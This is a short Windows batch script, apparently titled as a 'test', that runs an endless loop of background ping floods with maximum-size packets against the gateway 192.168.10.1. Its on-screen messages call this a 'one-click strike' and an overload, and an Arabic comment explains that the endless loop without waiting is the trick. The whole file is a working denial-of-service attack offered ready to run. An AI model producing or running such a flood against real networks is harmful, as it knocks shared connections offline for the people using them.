@echo off
title 7ARBI - INSTANT 277 TEST
color 0C
cls

echo [+] PREPARING ONE-CLICK STRIKE...
timeout /t 1 >nul

:: السر في تكرار الأمر داخل حلقة لا نهائية وبدون انتظار (Start /b)
:kill
echo [ATTACKING] -> GATEWAY: 192.168.10.1 -- OVERLOAD ACTIVE
start /b ping 192.168.10.1 -t -l 65500 -w 1 >nul
start /b ping 192.168.10.1 -t -l 65500 -w 1 >nul
start /b ping 192.168.10.1 -t -l 65500 -w 1 >nul
start /b ping 192.168.10.1 -t -l 65500 -w 1 >nul
goto kill
